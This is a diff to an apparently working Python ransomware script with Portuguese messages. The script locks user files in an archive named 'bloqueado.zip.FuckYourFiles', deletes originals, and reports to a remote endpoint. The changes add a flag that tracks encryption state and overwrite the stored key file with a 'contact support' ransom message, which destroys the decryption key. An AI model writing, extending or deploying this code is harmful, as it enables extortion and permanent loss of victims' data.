@@ -8,12 +8,14 @@ from distutils.log import info
 from os.path import exists
 from pathlib import Path
 from time import sleep
+from types import ClassMethodDescriptorType
 
 import psutil
 import pyzipper
 from cryptography.fernet import Fernet
 from requests import get
 
+criptografadoNesteMomento = False
 key = ''.encode()
 while True:
     if exists('usuario/bloqueado.zip.FuckYourFiles'):
@@ -80,6 +82,7 @@ while True:
         except OSError:
             os.remove(filepath)
     shutil.move('bloqueado.zip.FuckYourFiles', 'usuario')
+    criptografadoNesteMomento = True
 
 print('parece que os arquivos já foram encriptados')
 
@@ -153,8 +156,8 @@ while True:
         with open('config/informationSent.xml', 'r') as informationSentFile:
             informationSent = informationSentFile.read()
     except:
-        print('as informações ainda não foram enviadas')
-    if confirmation in informationSent:
+        print('as informações ainda não formam enviadas')
+    if confirmation in informationSent and criptografadoNesteMomento == False:
         print('a informação já foi enviada')
         break
 
@@ -163,6 +166,10 @@ while True:
         enviaInformacao()
         with open('config/informationSent.xml', 'w') as informationSentFile:
             informationSent = informationSentFile.write('sim')
+
+        with open('config/filekey.key', 'w') as filekey:
+            key = filekey.write(
+                'entre em contato com o suporte')
         break
     else:
         print('falha na conexão!\nTentando novamente...')
